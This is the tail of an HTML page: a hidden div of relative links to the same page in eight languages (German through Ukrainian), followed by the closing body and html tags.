<div style="display: none;"><a href="/lib/index.php?lang=de&amp;id=vhh07">de</a><a href="/lib/index.php?lang=en&amp;id=vhh07">en</a><a href="/lib/index.php?lang=es&amp;id=vhh07">es</a><a href="/lib/index.php?lang=it&amp;id=vhh07">it</a><a href="/lib/index.php?lang=fr&amp;id=vhh07">fr</a><a href="/lib/index.php?lang=pl&amp;id=vhh07">pl</a><a href="/lib/index.php?lang=ru&amp;id=vhh07">ru</a><a href="/lib/index.php?lang=ua&amp;id=vhh07">ua</a></div>
</body>
</html>
